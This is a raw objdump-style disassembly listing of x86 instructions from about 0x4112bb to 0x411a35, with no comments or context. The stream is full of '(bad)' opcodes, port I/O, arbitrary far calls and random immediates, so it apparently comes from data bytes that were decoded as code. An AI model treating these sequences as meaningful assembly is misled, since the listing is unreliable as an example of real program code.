  4112bb:	add    eax,0x72a6a789
  4112c0:	adc    eax,0xc93b7cb4
  4112c5:	jo     0x411274
  4112c7:	and    ebx,esi
  4112c9:	in     al,dx
  4112ca:	loopne 0x411255
  4112cc:	fsubr  QWORD PTR [ecx+0x72]
  4112cf:	bound  ebx,QWORD PTR [edi*4+0x5a9231bf]
  4112d6:	jnp    0x4112d6
  4112d8:	cmp    al,0x15
  4112da:	or     dl,BYTE PTR [eax-0x59c6456c]
  4112e0:	ins    DWORD PTR es:[edi],dx
  4112e1:	gs mov bl,0x4e
  4112e4:	mov    ebx,0xb32e6d7d
  4112e9:	mov    al,0xcf
  4112eb:	cdq    
  4112ec:	(bad)  
  4112ed:	sbb    ecx,DWORD PTR [eax-0x66]
  4112f0:	push   0x5f0298d0
  4112f5:	aad    0xef
  4112f7:	call   0xc1a8f0bc
  4112fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112fd:	bound  ecx,QWORD PTR [edx-0x41]
  411300:	stc    
  411301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411302:	add    DWORD PTR ds:0xad41f6e3,0x568f4428
  41130c:	sub    eax,DWORD PTR [ebx]
  41130e:	add    BYTE PTR [eax+eax*1],dh
  411311:	push   ebp
  411312:	sub    al,0x8e
  411314:	jmp    0xda46:0xe89e50ff
  41131b:	adc    ecx,esp
  41131d:	cmp    eax,0xb7601b9d
  411322:	call   0x13835d06
  411327:	lea    edx,[esi+0x46cdf850]
  41132d:	neg    DWORD PTR [esi+0x132f7a37]
  411333:	scas   al,BYTE PTR es:[edi]
  411334:	lods   al,BYTE PTR ds:[esi]
  411335:	and    DWORD PTR [esi+edx*2+0x34],ebp
  411339:	repz rcl BYTE PTR ds:0xb3611289,cl
  411340:	cmp    al,0x3b
  411342:	dec    edi
  411343:	fsubrp st(6),st
  411345:	adc    esi,DWORD PTR ds:0x9e88e490
  41134b:	outs   dx,DWORD PTR ds:[esi]
  41134c:	mov    dh,0x9f
  41134e:	xchg   esi,eax
  41134f:	repnz sub dl,ah
  411352:	mov    ebp,0x8466ecfe
  411357:	sbb    al,0xc8
  411359:	cmp    al,0x8e
  41135b:	mov    ch,0x5
  41135d:	dec    BYTE PTR [edx+0x79]
  411360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411361:	mov    ch,0xe8
  411363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411364:	stos   BYTE PTR es:[edi],al
  411365:	arpl   bp,bp
  411367:	pop    es
  411368:	mov    eax,ds:0x71928bc
  41136d:	das    
  41136e:	or     ebp,esp
  411370:	inc    esp
  411371:	dec    eax
  411372:	in     al,0xcb
  411374:	add    eax,0x7740942f
  411379:	call   0x6ea3:0x61cd5be3
  411380:	fisttp WORD PTR [edi+0x39c0d798]
  411386:	and    DWORD PTR [eax-0x53],esi
  411389:	es jecxz 0x411364
  41138c:	rcl    BYTE PTR [esi+esi*2],1
  41138f:	call   0x3b9a:0xe22d22f1
  411396:	or     BYTE PTR [esi+0x65],bh
  411399:	mov    dl,BYTE PTR [edx+0x54]
  41139c:	out    dx,eax
  41139d:	push   edx
  41139e:	fcom   st(1)
  4113a0:	dec    edi
  4113a1:	and    ebp,eax
  4113a3:	mov    dl,0xfb
  4113a5:	cmp    ebp,ebp
  4113a7:	pop    ss
  4113a8:	push   ebx
  4113a9:	pop    ecx
  4113aa:	cmp    al,dl
  4113ac:	push   esp
  4113ad:	adc    al,cl
  4113af:	out    0x3e,al
  4113b1:	jae    0x4113fd
  4113b3:	sbb    BYTE PTR [edi+0xb],0x92
  4113b7:	stc    
  4113b8:	(bad)  
  4113b9:	loope  0x41141a
  4113bb:	std    
  4113bc:	mov    edi,0xca6e4b97
  4113c1:	fisttp DWORD PTR [edx]
  4113c3:	sub    DWORD PTR [ebx+0x2e5eec27],esp
  4113c9:	(bad)  
  4113ca:	enter  0x6375,0xca
  4113ce:	inc    esp
  4113cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113d0:	jmp    0x77863b50
  4113d5:	mov    ch,0x95
  4113d7:	dec    DWORD PTR [edx]
  4113d9:	(bad)  
  4113da:	mov    ds:0xc1d760bf,eax
  4113df:	mov    ds:0xe43a5c0a,eax
  4113e4:	test   DWORD PTR [edx+0x73],edx
  4113e7:	por    mm2,QWORD PTR [esp+edx*8-0xd]
  4113ec:	ss aas 
  4113ee:	push   esi
  4113ef:	int3   
  4113f0:	sbb    DWORD PTR [esi-0x60],ebx
  4113f3:	push   esp
  4113f4:	out    0xff,eax
  4113f6:	in     eax,dx
  4113f7:	push   esp
  4113f8:	stos   BYTE PTR es:[edi],al
  4113f9:	xor    BYTE PTR [ecx+0x23],al
  4113fc:	and    ebp,esi
  4113fe:	mov    cl,0xdf
  411400:	icebp  
  411401:	sbb    esi,ebp
  411403:	add    eax,0xddf1d744
  411408:	in     al,dx
  411409:	cs push ebx
  41140b:	jl     0x411449
  41140d:	push   cs
  41140e:	in     eax,dx
  41140f:	dec    eax
  411410:	fadd   st(1),st
  411412:	icebp  
  411413:	test   eax,0xc827fa00
  411419:	aad    0x6b
  41141b:	fisub  WORD PTR [esi+esi*1-0x75]
  41141f:	(bad)  
  411420:	cwde   
  411421:	inc    esp
  411422:	dec    eax
  411423:	iret   
  411424:	push   edi
  411425:	mov    ch,0x3f
  411427:	xor    bh,BYTE PTR [edi-0x65996785]
  41142d:	gs es push ds
  411430:	hlt    
  411431:	push   edi
  411432:	mov    eax,ds:0x512029a6
  411437:	lods   al,BYTE PTR ds:[esi]
  411438:	jecxz  0x411403
  41143a:	scas   eax,DWORD PTR es:[edi]
  41143b:	clc    
  41143c:	(bad)  
  41143d:	neg    ch
  41143f:	in     eax,0xc3
  411441:	cdq    
  411442:	(bad)  
  411443:	pop    ebx
  411444:	aas    
  411445:	sub    al,0xf
  411447:	movd   mm4,ebx
  41144a:	les    edx,FWORD PTR [esi-0x26b4fdc7]
  411450:	and    al,0xd8
  411452:	lods   eax,DWORD PTR ds:[esi]
  411453:	cmp    edx,ebx
  411455:	xchg   ecx,eax
  411456:	pop    eax
  411457:	shl    BYTE PTR [ebp-0x64],1
  41145a:	push   edx
  41145b:	fidivr DWORD PTR [esi+0x4668914f]
  411461:	and    al,0x97
  411463:	sub    ebp,DWORD PTR [esi]
  411465:	repnz xchg esp,eax
  411467:	sti    
  411468:	aad    0xce
  41146a:	mov    bh,BYTE PTR [eax-0x45b0a303]
  411470:	jle    0x4114e6
  411472:	inc    esp
  411473:	jnp    0x411485
  411475:	adc    ebp,DWORD PTR [eax]
  411477:	adc    dl,ch
  411479:	test   eax,0xf694993
  41147e:	pop    eax
  41147f:	pop    eax
  411480:	mov    ebx,0x5153a8c2
  411485:	shl    al,0x4d
  411488:	cmp    eax,0x83c2fdf4
  41148d:	sar    DWORD PTR [esi],1
  41148f:	jns    0x411465
  411491:	or     eax,edx
  411493:	push   eax
  411494:	ja     0x41147f
  411496:	dec    eax
  411497:	or     eax,0x63282e3f
  41149c:	or     al,0x6f
  41149e:	(bad)  
  41149f:	xor    cl,BYTE PTR [ecx-0x2580906b]
  4114a5:	sbb    dl,bl
  4114a7:	loop   0x4114dc
  4114a9:	push   ds
  4114aa:	jp     0x4114ea
  4114ac:	push   edx
  4114ad:	arpl   di,cx
  4114af:	ins    DWORD PTR es:[edi],dx
  4114b0:	adc    dl,BYTE PTR [ebx+ebp*4-0x73631937]
  4114b7:	fwait
  4114b8:	hlt    
  4114b9:	das    
  4114ba:	pop    esi
  4114bb:	int3   
  4114bc:	cmp    BYTE PTR [edi-0x6583719c],0x1b
  4114c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114c4:	or     al,0xc0
  4114c6:	leave  
  4114c7:	jle    0x4114d2
  4114c9:	pop    edi
  4114ca:	stos   BYTE PTR es:[edi],al
  4114cb:	sbb    BYTE PTR [ecx+0xd50e0ea],dl
  4114d1:	mov    cl,0x4f
  4114d3:	aad    0x1c
  4114d5:	gs pusha 
  4114d7:	inc    ecx
  4114d8:	mov    edx,0x3ca55a74
  4114dd:	xor    al,0x87
  4114df:	mov    edi,0xa5c1902b
  4114e4:	loope  0x4114cb
  4114e6:	test   ecx,eax
  4114e8:	cmp    bl,BYTE PTR [edi]
  4114ea:	fsubr  DWORD PTR [edi+0x5f]
  4114ed:	pop    esp
  4114ee:	dec    ecx
  4114ef:	add    ch,bh
  4114f1:	pop    ss
  4114f2:	mov    eax,ds:0x4758f3ed
  4114f7:	push   0x69
  4114f9:	dec    esp
  4114fa:	out    0x5f,eax
  4114fc:	daa    
  4114fd:	aaa    
  4114fe:	jb     0x411537
  411500:	sub    dl,0xec
  411503:	jge    0x4114f5
  411505:	jne    0x4114f7
  411507:	push   ecx
  411508:	mov    ebx,DWORD PTR [eax]
  41150a:	jo     0x41151e
  41150c:	ds jb  0x4114be
  41150f:	daa    
  411510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411511:	outs   dx,DWORD PTR ss:[esi]
  411513:	sbb    BYTE PTR [eax],0xd8
  411516:	(bad)  
  411517:	jecxz  0x4114cf
  411519:	lock rcl DWORD PTR [esp+esi*4+0x61881a8c],0x25
  411522:	jb     0x4114ca
  411524:	jge    0x411502
  411526:	xchg   ebp,eax
  411527:	xchg   ebx,eax
  411528:	addr16 adc esp,esi
  41152b:	pop    ss
  41152c:	in     eax,0x5d
  41152e:	mov    ds:0x9c453d1b,al
  411533:	sub    esi,DWORD PTR [edx-0x6a]
  411536:	xchg   ebx,eax
  411537:	ds ins BYTE PTR es:[edi],dx
  411539:	cmp    DWORD PTR [eax],ebx
  41153b:	mov    ch,0xe2
  41153d:	pusha  
  41153e:	add    ebp,DWORD PTR [ebx+esi*4]
  411541:	xor    bl,ah
  411543:	lods   eax,DWORD PTR ds:[esi]
  411544:	rol    DWORD PTR [ebx],1
  411546:	sbb    bh,BYTE PTR [edx+ebx*1-0x1ff761a3]
  41154d:	bound  edx,QWORD PTR [esi]
  41154f:	jnp    0x411535
  411551:	popa   
  411552:	sub    BYTE PTR [ecx],al
  411554:	and    al,0x19
  411556:	and    DWORD PTR [edi],ebx
  411558:	in     al,dx
  411559:	xchg   edi,eax
  41155a:	jle    0x4114ff
  41155c:	pop    ds
  41155d:	cmp    DWORD PTR [esi+0x2c],0xf1eb1c19
  411564:	ja     0x41154e
  411566:	out    0x70,al
  411568:	sti    
  411569:	mov    edi,0xa5a6a25b
  41156e:	jno    0x411565
  411570:	(bad)  
  411572:	jnp    0x4115f0
  411574:	xor    al,bl
  411576:	(bad)  
  411577:	push   ds
  411578:	jg     0x411582
  41157a:	int3   
  41157b:	sub    edx,edi
  41157d:	mov    al,0x6
  41157f:	xchg   ecx,eax
  411580:	dec    eax
  411581:	aas    
  411582:	(bad)  
  411583:	sti    
  411584:	xor    edi,0x69e00397
  41158a:	pop    es
  41158b:	push   esp
  41158c:	xlat   BYTE PTR ds:[ebx]
  41158d:	mov    edx,0x40429a05
  411592:	pusha  
  411593:	stos   DWORD PTR es:[edi],eax
  411594:	sbb    DWORD PTR [eax+ecx*2+0x4a],ebx
  411598:	mov    dh,0xad
  41159a:	jnp    0x411598
  41159c:	fcom   QWORD PTR [ebp-0x459994ad]
  4115a2:	repz cmp DWORD PTR [eax-0x15],0xd
  4115a7:	sub    eax,DWORD PTR [edi]
  4115a9:	test   DWORD PTR [esi-0x82eae43],ebp
  4115af:	push   0x28fefd6c
  4115b4:	pop    es
  4115b5:	xor    ah,dl
  4115b7:	mov    ch,0x13
  4115b9:	pusha  
  4115ba:	imul   edx,edx,0xffffffd8
  4115bd:	pop    edx
  4115be:	cmp    DWORD PTR [edi],0x4d
  4115c1:	mov    ah,0x9a
  4115c3:	xor    cl,BYTE PTR [ecx]
  4115c5:	pop    es
  4115c6:	icebp  
  4115c7:	jecxz  0x411617
  4115c9:	xchg   esp,eax
  4115ca:	pop    esi
  4115cb:	jae    0x4115d8
  4115cd:	daa    
  4115ce:	inc    ebx
  4115cf:	cmp    eax,ebp
  4115d1:	fcom   DWORD PTR [ecx-0x75f8eb3f]
  4115d7:	ficom  DWORD PTR [ebp-0x52fac184]
  4115dd:	int    0xc7
  4115df:	xor    al,0x86
  4115e1:	pop    ebx
  4115e2:	mov    ebx,0xbbfef9b3
  4115e7:	in     eax,dx
  4115e8:	jne    0x411646
  4115ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115eb:	mov    bl,0x61
  4115ed:	nop
  4115ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115ef:	pop    edi
  4115f0:	test   esi,esp
  4115f2:	cwde   
  4115f3:	jp     0x411669
  4115f5:	out    dx,eax
  4115f6:	out    0xc4,eax
  4115f8:	jmp    0x4115ac
  4115fa:	adc    eax,0x722e1666
  4115ff:	mov    edi,DWORD PTR [esi+ebp*8+0x76]
  411603:	(bad)
  411607:	daa    
  411608:	inc    ebx
  411609:	sub    al,0xac
  41160b:	xchg   esp,eax
  41160c:	hlt    
  41160d:	mov    bl,0x77
  41160f:	pop    edi
  411610:	pop    ebp
  411611:	(bad)  
  411614:	push   ebx
  411615:	mov    ebp,0x3b71133
  41161a:	jb     0x4115cb
  41161c:	or     BYTE PTR es:0x52d9351f,bl
  411623:	mov    edi,0x39f98d56
  411628:	pop    esp
  411629:	dec    edi
  41162a:	sub    edi,DWORD PTR [ebx+edi*4]
  41162d:	nop
  41162e:	jae    0x411604
  411630:	clc    
  411631:	adc    BYTE PTR [edx],dh
  411633:	std    
  411634:	jp     0x411631
  411636:	cdq    
  411637:	sbb    esp,DWORD PTR fs:[ebp-0x50]
  41163b:	sbb    BYTE PTR [ebx-0x79],dl
  41163e:	cwde   
  41163f:	mov    edx,0x80f79000
  411644:	lds    edi,FWORD PTR [ebp-0x1]
  411647:	xchg   ebp,eax
  411648:	xchg   ebp,eax
  411649:	in     eax,0xca
  41164b:	rcr    DWORD PTR [edx],cl
  41164d:	jns    0x411653
  41164f:	sahf   
  411650:	push   ss
  411651:	les    esi,FWORD PTR [edx+ecx*1-0x35]
  411655:	int3   
  411656:	and    al,0x56
  411658:	xchg   ebx,ecx
  41165a:	mov    esi,0x157c3249
  41165f:	dec    edi
  411660:	push   ds
  411661:	xor    al,0xe9
  411663:	mov    esi,0x808d0d6
  411668:	mov    esp,0xee7798be
  41166d:	fisttp QWORD PTR [eax]
  41166f:	pop    ds
  411670:	(bad)  
  411671:	outs   dx,BYTE PTR fs:[esi]
  411673:	aam    0xcf
  411675:	jo     0x411653
  411677:	inc    edi
  411678:	push   edx
  411679:	lock das 
  41167b:	cli    
  41167c:	aad    0xce
  41167e:	sahf   
  41167f:	sbb    DWORD PTR [ebx+edi*8+0x33],ebp
  411683:	mov    ds:0x2a4a2ed2,eax
  411688:	out    0x7c,al
  41168a:	inc    edi
  41168b:	sbb    cl,ch
  41168d:	dec    edx
  41168e:	jmp    0x4116c7
  411690:	inc    esi
  411691:	gs pop ebx
  411693:	add    DWORD PTR [ebp+0x20],esi
  411696:	std    
  411697:	xor    esp,edi
  411699:	je     0x4116f9
  41169b:	mov    al,ds:0xe089bbfc
  4116a0:	or     bl,cl
  4116a2:	and    DWORD PTR [ebx],ecx
  4116a4:	data16 gs mov ah,0x24
  4116a8:	cli    
  4116a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116aa:	xchg   ebx,eax
  4116ab:	xlat   BYTE PTR ds:[ebx]
  4116ac:	mov    ds:0x825e0743,al
  4116b1:	arpl   WORD PTR [edi],si
  4116b3:	ss int3 
  4116b5:	enter  0x34f3,0x86
  4116b9:	ins    DWORD PTR es:[edi],dx
  4116ba:	rcr    cl,0xf3
  4116bd:	lock push edx
  4116bf:	mov    DWORD PTR [ecx],0x1126d396
  4116c5:	adc    DWORD PTR ds:0x33fa7ba2,edi
  4116cb:	(bad)  
  4116cc:	fldcw  WORD PTR [eax+0x126c3f91]
  4116d2:	xor    esp,ebp
  4116d4:	jae    0x411753
  4116d6:	xchg   esp,eax
  4116d7:	pusha  
  4116d8:	arpl   WORD PTR [esi+0x38b2000a],bx
  4116de:	outs   dx,DWORD PTR ds:[esi]
  4116df:	xor    esp,DWORD PTR ds:0x99af0bdd
  4116e5:	fistp  WORD PTR [edi]
  4116e7:	push   es
  4116e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116e9:	mov    al,0x61
  4116eb:	mov    ah,ah
  4116ed:	jo     0x411717
  4116ef:	mov    edx,fs
  4116f1:	xor    BYTE PTR [esi+0x2ca290ba],ah
  4116f7:	(bad)  
  4116f9:	adc    eax,0x1b2e1a57
  4116fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116ff:	dec    esi
  411700:	loop   0x411690
  411702:	add    ebp,eax
  411704:	fdivr  st,st(7)
  411706:	add    al,0xfa
  411708:	inc    esi
  411709:	or     eax,0x6f09398a
  41170e:	out    0x99,eax
  411710:	call   0x43800114
  411715:	adc    esi,DWORD PTR [ebx]
  411717:	pop    ss
  411718:	inc    eax
  411719:	daa    
  41171a:	dec    edi
  41171b:	mov    edi,0x167ad11
  411720:	into   
  411721:	hlt    
  411722:	lds    edx,FWORD PTR [edi+0x1c]
  411725:	mov    DWORD PTR [esi+ebx*8],edx
  411728:	shr    esi,cl
  41172a:	cmp    DWORD PTR [eax+eax*1],esi
  41172d:	xlat   BYTE PTR ds:[ebx]
  41172e:	(bad)  
  41172f:	push   esp
  411730:	(bad)  
  411731:	(bad)  
  411733:	add    cl,BYTE PTR [edx+0x5ccf99ff]
  411739:	and    DWORD PTR [eax],ebx
  41173b:	mov    edx,DWORD PTR [eax+0x31]
  41173e:	mov    cl,0x73
  411740:	mov    esp,0xafde6f2c
  411745:	pop    esi
  411746:	jae    0x411744
  411748:	sbb    eax,0x7c83def3
  41174d:	or     eax,0x2844af45
  411752:	sbb    al,0xea
  411754:	(bad)  
  411755:	mov    esp,DWORD PTR [eax]
  411757:	mov    ds,WORD PTR [edx+eax*8-0x5f]
  41175b:	stos   BYTE PTR es:[edi],al
  41175c:	leave  
  41175d:	mov    eax,0xfea2e385
  411762:	loope  0x4116ff
  411764:	inc    eax
  411765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411766:	cmp    DWORD PTR [ecx],edi
  411768:	sbb    edx,DWORD PTR [ebp-0x67]
  41176b:	test   eax,0xe34940da
  411770:	inc    edi
  411771:	hlt    
  411772:	stc    
  411773:	sbb    al,0xe8
  411775:	out    dx,eax
  411776:	das    
  411777:	pushf  
  411778:	push   eax
  411779:	xchg   esp,eax
  41177a:	outs   dx,DWORD PTR ds:[esi]
  41177b:	or     BYTE PTR [ebx+0x61080672],cl
  411781:	dec    ebp
  411782:	lea    ebx,[esi]
  411784:	push   ss
  411785:	ins    BYTE PTR es:[edi],dx
  411786:	dec    ebx
  411787:	dec    ebx
  411788:	cs sbb eax,0xa121fbf
  41178e:	or     ebx,ebp
  411790:	sub    eax,DWORD PTR [ebx+0x1a]
  411793:	mov    ah,0xc3
  411795:	mov    eax,0x68e1b818
  41179a:	mov    al,0x4e
  41179c:	jae    0x411775
  41179e:	fisubr WORD PTR [eax+0x50]
  4117a1:	xchg   ebp,eax
  4117a2:	adc    ch,BYTE PTR [esp+eiz*2+0x42bff87f]
  4117a9:	sbb    al,0x8f
  4117ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117ac:	(bad)  [eax]
  4117ae:	faddp  st(7),st
  4117b0:	out    0x4f,al
  4117b2:	stos   BYTE PTR es:[edi],al
  4117b3:	iret   
  4117b4:	mov    cl,0xc5
  4117b6:	div    esp
  4117b8:	mov    cl,0x71
  4117ba:	jnp    0x4117d7
  4117bc:	dec    ebx
  4117bd:	je     0x41177a
  4117bf:	jle    0x411821
  4117c1:	mov    esi,0x91fec463
  4117c6:	repz in eax,0x33
  4117c9:	push   es
  4117ca:	in     al,dx
  4117cb:	push   edi
  4117cc:	daa    
  4117cd:	xlat   BYTE PTR ds:[ebx]
  4117ce:	and    al,BYTE PTR [edi+0x56]
  4117d1:	xchg   ebx,eax
  4117d2:	(bad)  
  4117d3:	mov    dl,0xfb
  4117d5:	sbb    eax,0xeb369f8f
  4117da:	les    ebp,FWORD PTR [esi]
  4117dc:	jnp    0x4117d2
  4117de:	inc    edi
  4117df:	out    0x39,al
  4117e1:	retf   0x6473
  4117e4:	call   0xab3b:0xf015d426
  4117eb:	dec    ebp
  4117ec:	pop    es
  4117ed:	loop   0x4117b8
  4117ef:	cli    
  4117f0:	adc    BYTE PTR [ecx],dl
  4117f2:	dec    esi
  4117f3:	jle    0x4117ba
  4117f5:	clc    
  4117f6:	or     al,0xe2
  4117f8:	and    eax,0xa79d4898
  4117fd:	mov    ebx,0x973e3c2f
  411802:	loope  0x4117b9
  411804:	lock lahf 
  411806:	xchg   ecx,eax
  411807:	jge    0x41179f
  411809:	cmp    edx,DWORD PTR [edi+0x5f]
  41180c:	jle    0x4117c5
  41180e:	xchg   ecx,eax
  41180f:	jle    0x411811
  411811:	jp     0x411870
  411813:	dec    ebp
  411814:	ins    BYTE PTR es:[edi],dx
  411815:	xchg   edi,eax
  411816:	cmp    al,0xf1
  411818:	fdivr  DWORD PTR [ebp+0x43d3a40e]
  41181e:	cmp    DWORD PTR [ecx-0x56],edx
  411821:	mov    ebp,DWORD PTR ds:0x6fecf26c
  411827:	add    al,0xd4
  411829:	add    DWORD PTR [ebp-0x3d28a375],ebx
  41182f:	jo     0x41188b
  411831:	sbb    al,0x62
  411833:	mov    bh,0x5e
  411835:	inc    BYTE PTR [eax+0x4ec4c623]
  41183b:	jp     0x4118b0
  41183d:	pop    esp
  41183e:	ja     0x411820
  411840:	mov    cl,0xc2
  411842:	or     DWORD PTR [ecx+0x7d1dc238],0xffffff8f
  411849:	mov    edi,0xd5d50200
  41184e:	add    al,0xc1
  411850:	cdq    
  411851:	push   esp
  411852:	and    BYTE PTR [eax],bh
  411854:	xor    DWORD PTR [esi],ebp
  411856:	mov    dl,0x4a
  411858:	shr    esp,1
  41185a:	outs   dx,DWORD PTR ds:[esi]
  41185b:	mov    cl,0x3a
  41185d:	les    esp,FWORD PTR [edi-0x1fed38fd]
  411863:	out    dx,eax
  411864:	cwde   
  411865:	and    DWORD PTR [ebx],esi
  411867:	fyl2xp1 
  411869:	stos   DWORD PTR es:[edi],eax
  41186a:	mov    ecx,0x2c5ae584
  41186f:	add    eax,0xf862e8de
  411874:	iret   
  411875:	lods   eax,DWORD PTR ds:[esi]
  411876:	js     0x411801
  411878:	popa   
  411879:	in     al,dx
  41187a:	rol    BYTE PTR [eax],1
  41187c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41187d:	and    DWORD PTR [ebx+0x64],esp
  411880:	jne    0x4118aa
  411882:	leave  
  411883:	mov    cl,0x79
  411885:	dec    esi
  411886:	push   eax
  411887:	xor    esi,DWORD PTR [esi+ecx*2]
  41188a:	and    ecx,DWORD PTR [edi-0x2fe99b4d]
  411890:	cmp    cl,al
  411892:	into   
  411893:	ror    BYTE PTR [eax-0x48],0x15
  411897:	mov    ch,0x22
  411899:	jne    0x41189a
  41189b:	loop   0x411871
  41189d:	xor    BYTE PTR [eax+0x6d825b81],ah
  4118a3:	xor    ch,bl
  4118a5:	lods   eax,DWORD PTR ds:[esi]
  4118a6:	and    DWORD PTR [esi-0x131c8c9e],edi
  4118ac:	aad    0x3b
  4118ae:	adc    eax,0xd3e91d84
  4118b3:	in     al,dx
  4118b4:	jbe    0x4118f9
  4118b6:	or     eax,0x8abe4a13
  4118bb:	cs xchg al,dh
  4118be:	dec    esi
  4118bf:	or     bl,BYTE PTR [esi-0x7c43e954]
  4118c5:	inc    edx
  4118c6:	ins    BYTE PTR es:[edi],dx
  4118c7:	cmp    bh,dl
  4118c9:	rol    DWORD PTR [esi],1
  4118cb:	mov    ecx,0x3dd8739a
  4118d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118d1:	cmp    al,0xef
  4118d3:	(bad)  
  4118d4:	dec    esi
  4118d5:	mov    dh,0xa4
  4118d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118d8:	sub    ebp,eax
  4118da:	push   edi
  4118db:	scas   al,BYTE PTR es:[edi]
  4118dc:	mov    BYTE PTR [eax-0x7d],cl
  4118df:	mov    eax,ds:0xbc444e51
  4118e4:	les    ebx,FWORD PTR [edx+0x5f7faac0]
  4118ea:	scas   al,BYTE PTR es:[edi]
  4118eb:	inc    edi
  4118ec:	cmc    
  4118ed:	mov    bh,0xa8
  4118ef:	push   esp
  4118f0:	mov    DWORD PTR [edx+0x13],esp
  4118f3:	sahf   
  4118f4:	int3   
  4118f5:	jl     0x4118af
  4118f7:	mov    eax,0xcb8d074b
  4118fc:	ret    
  4118fd:	xor    al,0xc7
  4118ff:	repnz addr16 dec eax
  411902:	jg     0x4118a2
  411904:	push   edx
  411905:	pop    ss
  411906:	and    al,0x30
  411908:	push   0x6dc4799b
  41190d:	test   BYTE PTR [edx+0x45],dh
  411910:	int    0xb7
  411912:	int3   
  411913:	adc    al,0x8c
  411915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411916:	enter  0x4c8e,0xd6
  41191a:	add    dl,ah
  41191c:	lea    eax,[edi+0x40]
  41191f:	das    
  411920:	mov    WORD PTR [eax],es
  411922:	push   cs
  411923:	sahf   
  411924:	test   DWORD PTR [ebx-0x37],eax
  411927:	pop    ss
  411928:	fsubr  DWORD PTR [ebx+edx*4]
  41192b:	ins    BYTE PTR es:[edi],dx
  41192c:	sbb    eax,0xb07ef4f
  411931:	inc    eax
  411932:	mov    eax,ds:0x7b1463b2
  411937:	and    al,0xdf
  411939:	sbb    bl,BYTE PTR [ebx]
  41193b:	call   0xb42a:0x9bf4674f
  411942:	pop    es
  411943:	mov    BYTE PTR fs:[eax+0x42],dl
  411947:	test   edx,ebp
  411949:	mov    al,ds:0x8b7e292
  41194e:	mov    ds:0x117c6743,eax
  411953:	(bad)  
  411954:	jnp    0x411950
  411956:	push   ecx
  411957:	inc    edi
  411958:	mov    WORD PTR [ebx],fs
  41195a:	cmp    BYTE PTR [edx],cl
  41195c:	test   al,dh
  41195e:	xchg   ebp,eax
  41195f:	test   al,0x89
  411961:	fstp   DWORD PTR [ebx+0x76008047]
  411967:	add    dh,cl
  411969:	push   ebp
  41196a:	fcmovbe st,st(0)
  41196c:	cmp    dh,0x2c
  41196f:	mov    ebp,0x6fe4716
  411974:	sub    BYTE PTR [ebx],ch
  411976:	cmc    
  411977:	stos   BYTE PTR es:[edi],al
  411978:	adc    al,0x3d
  41197a:	push   eax
  41197b:	std    
  41197c:	arpl   WORD PTR [edi],sp
  41197e:	and    BYTE PTR [edx],bl
  411980:	pusha  
  411981:	xchg   esp,eax
  411982:	adc    ecx,ecx
  411984:	adc    eax,0x79965427
  411989:	push   esp
  41198a:	xchg   ebx,eax
  41198b:	pop    ds
  41198c:	pop    ebp
  41198d:	cmp    al,0x89
  41198f:	and    eax,0xbf9ad1cb
  411994:	lods   eax,DWORD PTR ds:[esi]
  411995:	out    0xf6,al
  411997:	test   al,0x27
  411999:	enter  0x9595,0xc3
  41199d:	cmp    bh,BYTE PTR [edi+0x47]
  4119a0:	sbb    edx,0x2
  4119a3:	sbb    eax,0xd8116e0
  4119a8:	dec    ebp
  4119a9:	fwait
  4119aa:	xor    bl,bl
  4119ac:	repnz out dx,eax
  4119ae:	mov    ecx,0xa98b954c
  4119b3:	shr    edi,0xc8
  4119b6:	pop    edx
  4119b7:	mov    esp,edi
  4119b9:	mov    edi,0x3d6d7d76
  4119be:	out    dx,al
  4119bf:	add    al,0xdf
  4119c1:	jae    0x411998
  4119c3:	mov    ah,0x30
  4119c5:	pop    es
  4119c6:	fs cmc 
  4119c8:	sti    
  4119c9:	mov    DWORD PTR [ecx],0xd26b0bfb
  4119cf:	mov    edi,0x5786000f
  4119d4:	dec    esp
  4119d5:	sub    BYTE PTR [ebx],al
  4119d7:	mov    edx,esp
  4119d9:	sub    BYTE PTR [ecx],bh
  4119db:	adc    edx,DWORD PTR [edx]
  4119dd:	pop    es
  4119de:	cld    
  4119df:	out    0x76,al
  4119e1:	mov    DWORD PTR [ecx],ebp
  4119e3:	cmp    eax,0xec700cdd
  4119e8:	fwait
  4119e9:	sbb    DWORD PTR [ebx-0x5c],ebx
  4119ec:	mov    bh,0xc9
  4119ee:	test   ebp,edi
  4119f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119f2:	sbb    al,0xd4
  4119f4:	inc    ebp
  4119f5:	or     ch,al
  4119f7:	and    al,0x55
  4119f9:	retf   0x4a15
  4119fc:	dec    ecx
  4119fd:	cmp    ch,ch
  4119ff:	and    al,0xa2
  411a01:	jae    0x4119e6
  411a03:	sub    eax,0xe91eafd7
  411a08:	les    esi,FWORD PTR [ebp-0x61]
  411a0b:	sbb    ecx,0xfdf3e770
  411a11:	(bad)  [esi+0x52]
  411a14:	mov    dh,0x1f
  411a16:	sub    al,0x1b
  411a18:	aaa    
  411a19:	test   al,0x8
  411a1b:	xchg   BYTE PTR [ebx],ch
  411a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a1e:	test   DWORD PTR [eax+0x3],ecx
  411a21:	cmp    cl,BYTE PTR [eax-0x60]
  411a24:	mov    ch,0x2a
  411a26:	in     eax,0x9e
  411a28:	cmp    bl,dl
  411a2a:	rcr    BYTE PTR [esi-0x7d],cl
  411a2d:	fstp   QWORD PTR [ecx+0x78a5100c]
  411a33:	push   0x1b
  411a35:	push   edx
